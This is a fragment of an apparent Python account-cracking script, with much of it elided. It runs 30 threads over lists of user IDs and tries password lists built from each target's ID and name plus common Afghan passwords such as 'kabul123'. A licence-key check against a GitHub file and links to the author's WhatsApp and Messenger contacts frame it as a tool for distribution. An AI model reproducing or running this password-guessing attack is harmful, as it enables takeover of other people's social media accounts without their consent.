...
{+}\033[1;32mFACEBOOK       : \033[1;32mRaziqullah Saadat.869\033[1;32m
{+}\033[1;32mYOUTUBE        : \033[1;32mSaadat Teching\033[1;32m
		...
		with tred(max_workers=30) as AXI:	
			...
			for psx in user:
				...
				if pcs in ['1','01']:
					...
					passlist = [psx,ids,'۱۲۳۴۵۶','afghan123','kabul123','khan1234']
				else:
					passlist = [psx,ids,'Afghanistan','10002000','786786','kabul1234','200300','500600','afghan123','kabul12345']
				if mthd in ['1','01']:
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/R-Saadat-R/Test/blob/main/T.txt').text
...
==================================================   """)
  ...
  print("")
  print("  SEND KEY ON WHATSAPP ");time.sleep(1)
  os.system('xdg-open https://m.me/ZAIN.ULLAH.869')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.                                      ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/R-Saadat-R/Test/blob/main/T.txt").text
    if id in httpCaht:
      ...
      print("    JOIN MY WHATSAPP GROUP"); time.sleep(2)
      os.system('xdg-open https://chat.whatsapp.com/IBITafA7ugtBTkRH760hj2')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def tnx():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://whatsapp.com/+93702856593')
      time.sleep(2)
      sys.exit()
  except: 
    sys.exit()
